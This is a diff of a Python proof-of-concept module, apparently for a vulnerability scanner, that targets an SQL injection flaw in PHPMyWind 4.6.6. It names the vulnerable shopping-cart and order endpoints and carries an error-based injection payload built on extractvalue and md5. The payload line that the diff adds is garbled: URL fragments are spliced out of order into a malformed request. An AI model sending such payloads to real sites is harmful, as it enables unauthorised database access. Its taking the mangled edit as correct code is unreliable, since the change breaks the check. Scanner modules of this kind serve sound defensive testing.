@@ -6,16 +6,20 @@ import re
 
 class Vuln(ABVuln):
     vuln_id = 'PHPMyWind_0001' # 平台漏洞编号，留空
-    name = 'PHPMyWind SQL注入漏洞'  # 漏洞名称
+    name = 'PHPMyWind SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
     type = VulnType.INJECTION # 漏洞类型
     disclosure_date = '2014-02-24'  # 漏洞公布时间
     desc = '''
+        PHPMyWind 多处 SQL注入漏洞：
+        /phpmywind/shoppingcart.php?a=a
+        /phpmywind/shoppingcart.php?a=addshopingcart&goodsid=1
+        /phpmywind/order.php?action=getarea
     '''  # 漏洞描述
     ref = ''  # 漏洞来源
     cnvd_id = ''  # cnvd漏洞编号
     cve_id = ''  # cve编号
-    product = 'phpmywind'  # 漏洞应用名称
+    product = 'PHPMyWind'  # 漏洞应用名称
     product_version = '4.6.6'  # 漏洞应用版本
 
 class Poc(ABPoc):
@@ -33,7 +37,7 @@ class Poc(ABPoc):
             
             hh = hackhttp.hackhttp()
             #No.1 refer=http://www.wooyun.org/bugs/wooyun-2010-048454
-            payload = "/phpmywind/shoppingcart.php?a=addshopingcart&typeid=1%20or%20@`\'`=1%20and%20extractvalue(1,concat(0x5c,md5(1)))%20and%20@`\\\'`"
+            payload = "ddshopingcart&typeid=1/phpmywind/shoppingcart.php?a=a%20or%20@`\'`=1%20and%20extractvalue(1,concat(0x5c,md5(1)))%20and%20@`\\\'`"
             target = self.target + payload
             code, head, body, errcode, final_url = hh.http(target);
 
